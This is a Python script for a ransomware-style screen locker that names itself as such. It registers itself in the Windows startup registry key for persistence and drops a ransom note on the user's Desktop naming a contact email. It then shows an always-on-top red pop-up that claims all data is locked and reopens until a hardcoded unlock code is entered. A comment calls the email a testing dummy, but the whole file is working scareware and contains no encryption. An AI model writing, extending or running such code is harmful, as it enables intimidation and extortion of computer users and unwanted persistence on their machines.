import os
import platform
import time

try:
    import tkinter as tk
    from tkinter import messagebox, ttk
except ImportError:
    tk = None
    messagebox = None
    ttk = None
try:
    import winsound  # For adding a beep sound on Windows
except ImportError:
    winsound = None
try:
    import winreg  # For adding to startup registry on Windows
except ImportError:
    winreg = None

# Configuration
# Dynamically set TARGET_DIR to the current user's Desktop or home directory
if platform.system() == "Windows":
    TARGET_DIR = os.path.join(os.getenv("USERPROFILE"), "Desktop")  # Gets C:/Users/CurrentUser/Desktop
    if not os.path.exists(TARGET_DIR):  # Fallback to home directory if Desktop doesn’t exist
        TARGET_DIR = os.getenv("USERPROFILE")
else:
    TARGET_DIR = os.path.expanduser("~/Desktop")  # Works on non-Windows, though pop-up won’t
MESSAGE = "WARNING: YOUR SYSTEM IS COMPROMISED! ALL DATA IS LOCKED! PAY NOW OR LOSE EVERYTHING FOREVER!\nEnter the unlock code to stop this alert:"
RANSOM_NOTE = "CRITICAL_WARNING.txt"  # Ransom note filename for backup
ALERT_TITLE = "SYSTEM BREACH DETECTED"  # Alarming title for the pop-up
PASSWORD = "2020745"  # Hardcoded password to stop the ransomware
RUNNING = True  # Global flag to control the loop


# Function to add the executable to Windows startup registry
def add_to_startup():
    if platform.system() == "Windows" and winreg:
        try:
            exe_path = os.path.abspath(os.sys.argv[0])
            key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, "Software\\Microsoft\\Windows\\CurrentVersion\\Run", 0,
                                 winreg.KEY_SET_VALUE)
            winreg.SetValueEx(key, "SystemAlertCritical", 0, winreg.REG_SZ, exe_path)
            winreg.CloseKey(key)
            print("Successfully added to startup.")
            return True
        except Exception as e:
            print(f"Error adding to startup: {e}")
            return False
    return False


# Function to create a ransom note with the message as a backup
def create_ransom_note():
    current_dir = TARGET_DIR
    if not os.path.exists(current_dir):
        try:
            os.makedirs(current_dir)
            print(f"Created directory: {current_dir}")
        except Exception as e:
            print(f"Could not create directory {current_dir}: {e}")
            current_dir = os.getcwd()
            print(f"Falling back to current directory: {current_dir}")
    note_path = os.path.join(current_dir, RANSOM_NOTE)
    try:
        with open(note_path, 'w') as f:
            f.write(MESSAGE + "\nContact darkhacker@protonmail.com for the unlock code.")#Dummy email for testing purrpose
        print(f"Ransom note created at: {note_path}")
    except Exception as e:
        print(f"Error creating ransom note: {e}")


# Function to play a warning beep sound (Windows only)
def play_warning_sound():
    if platform.system() == "Windows" and winsound:
        try:
            winsound.Beep(200, 500)  # Frequency: 200Hz, Duration: 500ms
            return True
        except Exception as e:
            print(f"Error playing sound: {e}")
            return False
    return False


# Function to create a custom pop-up with password input using tkinter
def show_password_popup():
    global RUNNING
    if tk is None or messagebox is None:
        print("tkinter not available, falling back to console mode.")
        return False

    def check_password():
        global RUNNING
        entered_password = password_entry.get()
        if entered_password == PASSWORD:
            messagebox.showinfo("Success", "Correct code entered. System unlocked.")
            root.destroy()
            RUNNING = False
        else:
           messagebox.showerror("Error", "Incorrect code. Try again or pay the ransom!")
        password_entry.delete(0, tk.END)
    # Create the main window
    root = tk.Tk()
    root.title(ALERT_TITLE)
    root.geometry("500x300")
    root.resizable(False, False)
    root.configure(bg="red")

# Make the window always on top
    root.attributes("-topmost", True)

# Create and style the warning label
    warning_label = tk.Label(root, text=MESSAGE, font=("Arial", 12, "bold"), fg="white", bg="red", wraplength=450)
    warning_label.pack(pady=20)

# Create password input field
    password_label = tk.Label(root, text="Unlock Code:", font=("Arial", 10), fg="white", bg="red")
    password_label.pack(pady=5)
    password_entry = ttk.Entry(root, show="*", width=30)
    password_entry.pack(pady=5)

# Create submit button
    submit_button = ttk.Button(root, text="Submit", command=check_password)
    submit_button.pack(pady=10)
# Play warning sound
    play_warning_sound()
# Run the window
    root.mainloop()
    return RUNNING


# Function to display persistent pop-up until correct password is entered
def show_persistent_popup():
    global RUNNING
    if platform.system() == "Windows" and tk:
        while RUNNING:
            show_password_popup()
            if RUNNING:
                time.sleep(0.5)  # Short delay before reopening if password is wrong
        print("Ransomware stopped due to correct password.")
    else:
        print("Custom pop-up not supported on this OS or tkinter unavailable.")


# Main function
def main():
    # Add to startup to ensure it runs after restart
    add_to_startup()

    # Create ransom note file as a backup
    create_ransom_note()

    # Show persistent pop-up with password input
    show_persistent_popup()


if __name__ == "__main__":
    main()

